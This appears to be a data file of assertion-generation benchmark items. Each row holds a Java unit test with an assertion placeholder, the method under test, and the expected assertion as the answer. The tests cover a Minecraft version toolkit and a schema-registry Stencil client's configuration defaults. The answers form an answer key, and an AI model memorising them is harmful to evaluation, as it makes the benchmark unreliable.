"IOException { if (!MinecraftToolkit.hasMinecraftDownloadConnection()) return; // Download all version information objects MinecraftToolkit.resetServerConnectionState(); MinecraftToolkit.resolveVersions();  // Parse it manually MinecraftVersionInfo info = MinecraftVersionToolkit.getLatestReleaseVersion(); URL u = new URL(MinecraftToolkit.version_manifest_url); InputStreamReader reader = new InputStreamReader(u.openStream()); JsonObject json = JsonParser.parseReader(reader).getAsJsonObject(); reader.close(); Gson gson = new Gson(); @SuppressWarnings(""unchecked"") Map<String, String> latest = gson.fromJson(json.get(""latest""), Map.class); String v = latest.get(""release"");  // Test if the version information matches ""<AssertPlaceHolder>""; }
getLatestReleaseVersion() { return MinecraftToolkit.available_versions.getOrDefault(""Latest_release"", null); }"	assertTrue(info.getVersion().equals(v))
"IOException { if (!MinecraftToolkit.hasMinecraftDownloadConnection()) return; // Download all version information objects MinecraftToolkit.resetServerConnectionState(); MinecraftToolkit.resolveVersions();  // Parse it manually MinecraftVersionInfo info = MinecraftVersionToolkit.getLatestSnapshotVersion(); URL u = new URL(MinecraftToolkit.version_manifest_url); InputStreamReader reader = new InputStreamReader(u.openStream()); JsonObject json = JsonParser.parseReader(reader).getAsJsonObject(); reader.close(); Gson gson = new Gson(); @SuppressWarnings(""unchecked"") Map<String, String> latest = gson.fromJson(json.get(""latest""), Map.class); String v = latest.get(""snapshot"");  // Test if the version information matches ""<AssertPlaceHolder>""; }
getLatestSnapshotVersion() { MinecraftVersionInfo info = MinecraftToolkit.available_versions.get(""Latest_snapshot""); if (info == null) return getLatestReleaseVersion(); else return info; }"	assertTrue(info.getVersion().equals(v))
"shouldReturnOriginalFieldIndex() { FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestBookingLogMessage.getDescriptor()); ""<AssertPlaceHolder>""; }
getOriginalFieldIndex(Descriptors.FieldDescriptor fieldDescriptor) { if (!fieldDescriptorIndexMap.containsKey(fieldDescriptor.getFullName())) { throw new IllegalArgumentException(""The Field Descriptor "" + fieldDescriptor.getFullName() + "" was not found in the cache""); } return fieldDescriptorIndexMap.get(fieldDescriptor.getFullName()); }"	"assertEquals(1, fieldDescriptorCache.getOriginalFieldIndex(TestBookingLogMessage.getDescriptor().findFieldByName(""order_number"")))"
"shouldReturnOriginalFieldCount() { FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestBookingLogMessage.getDescriptor()); ""<AssertPlaceHolder>""; }
getOriginalFieldCount(Descriptors.Descriptor descriptor) { if (!protoDescriptorArityMap.containsKey(descriptor.getFullName())) { throw new IllegalArgumentException(""The Proto Descriptor "" + descriptor.getFullName() + "" was not found in the cache""); } return protoDescriptorArityMap.get(descriptor.getFullName()); }"	assertEquals(49, fieldDescriptorCache.getOriginalFieldCount(TestBookingLogMessage.getDescriptor()))
"IllegalAccessException { when(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_ENABLE_KEY, SCHEMA_REGISTRY_STENCIL_ENABLE_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_ENABLE_DEFAULT); when(configuration.getString(SCHEMA_REGISTRY_STENCIL_URLS_KEY, SCHEMA_REGISTRY_STENCIL_URLS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_URLS_DEFAULT); when(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT); when(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT); when(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT); when(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(configuration); stencilClient = stencilClientOrchestrator.getStencilClient();  ""<AssertPlaceHolder>""; Field stencilClientField = StencilClientOrchestrator.class.getDeclaredField(""stencilClient""); stencilClientField.setAccessible(true); stencilClientField.set(null, null); }
getStencilClient() {  if (stencilClient != null) { return stencilClient; }  stencilClient = initStencilClient(new ArrayList<>(stencilUrls)); return stencilClient; }"	assertEquals(ClassLoadStencilClient.class, stencilClient.getClass())
"IllegalAccessException { when(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_ENABLE_KEY, SCHEMA_REGISTRY_STENCIL_ENABLE_DEFAULT)).thenReturn(true); when(configuration.getString(SCHEMA_REGISTRY_STENCIL_URLS_KEY, SCHEMA_REGISTRY_STENCIL_URLS_DEFAULT)).thenReturn(""http://localhost/latest,"" + ""http://localhost/events/latest,"" + ""http://localhost/entities/release""); when(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT); when(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT); when(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT); when(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(configuration); stencilClient = stencilClientOrchestrator.getStencilClient();  ""<AssertPlaceHolder>""; Field stencilClientField = StencilClientOrchestrator.class.getDeclaredField(""stencilClient""); stencilClientField.setAccessible(true); stencilClientField.set(null, null); }
getStencilClient() {  if (stencilClient != null) { return stencilClient; }  stencilClient = initStencilClient(new ArrayList<>(stencilUrls)); return stencilClient; }"	assertEquals(MultiURLStencilClient.class, stencilClient.getClass())
"IllegalAccessException { when(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_ENABLE_KEY, SCHEMA_REGISTRY_STENCIL_ENABLE_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_ENABLE_DEFAULT); when(configuration.getString(SCHEMA_REGISTRY_STENCIL_URLS_KEY, SCHEMA_REGISTRY_STENCIL_URLS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_URLS_DEFAULT); when(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT); when(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT); when(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT); when(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(configuration);  List<String> enrichmentStencilURLs = Collections .singletonList(""http://localhost/latest"");  StencilClient enrichedStencilClient = stencilClientOrchestrator.enrichStencilClient(enrichmentStencilURLs);  ""<AssertPlaceHolder>""; Field stencilClientField = StencilClientOrchestrator.class.getDeclaredField(""stencilClient""); stencilClientField.setAccessible(true); stencilClientField.set(null, null); }
enrichStencilClient(List<String> additionalStencilUrls) { if (additionalStencilUrls.isEmpty()) { return stencilClient; }  stencilUrls.addAll(additionalStencilUrls); stencilClient = initStencilClient(new ArrayList<>(stencilUrls)); return stencilClient; }"	assertEquals(ClassLoadStencilClient.class, enrichedStencilClient.getClass())
"shouldReturnDefaultTimeoutIfTimeoutMsConfigNotSet() { Map<String, String> configMap = new HashMap<>(); Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Integer.valueOf(10000), stencilConfig.getFetchTimeoutMs())
"shouldReturnConfiguredTimeoutIfTimeoutMsConfigIsSet() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, ""8000""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Integer.valueOf(8000), stencilConfig.getFetchTimeoutMs())
"shouldReturnTrueIfCacheAutoRefreshIsSetToTrue() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, ""true""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertTrue(stencilConfig.getCacheAutoRefresh())
"shouldReturnFalseIfCacheAutoRefreshIsSetToFalse() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, ""false""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertFalse(stencilConfig.getCacheAutoRefresh())
"shouldReturnFalseIfCacheAutoRefreshIsNotSet() { Map<String, String> configMap = new HashMap<>();  Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertFalse(stencilConfig.getCacheAutoRefresh())
"shouldReturnConfiguredValueIfCacheTtlMsConfigIsSet() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, ""7800""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Long.valueOf(7800), stencilConfig.getCacheTtlMs())
"shouldReturnDefaultValueIfCacheTtlMsConfigIsNotSet() { Map<String, String> configMap = new HashMap<>();  Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Long.valueOf(900000), stencilConfig.getCacheTtlMs())
"shouldReturnVersionBasedIfRefreshStrategyConfigIsSet() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, ""VERSION_BASED_REFRESH""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(SchemaRefreshStrategy.versionBasedRefresh().getClass(), stencilConfig.getRefreshStrategy().getClass())
"shouldReturnLongPollingIfRefreshStrategyConfigIsNotSet() { Map<String, String> configMap = new HashMap<>();  Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(SchemaRefreshStrategy.longPollingStrategy().getClass(), stencilConfig.getRefreshStrategy().getClass())
"shouldReturnLongPollingIfRefreshStrategyConfigIsInvalid() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, ""xyz""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(SchemaRefreshStrategy.longPollingStrategy().getClass(), stencilConfig.getRefreshStrategy().getClass())
"shouldReturnConfiguredValueIfFetchBackoffMinMsConfigIsSet() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, ""7800""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Long.valueOf(7800), stencilConfig.getFetchBackoffMinMs())
"shouldReturnDefaultValueIfFetchBackoffMinMsConfigIsNotSet() { Map<String, String> configMap = new HashMap<>();  Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
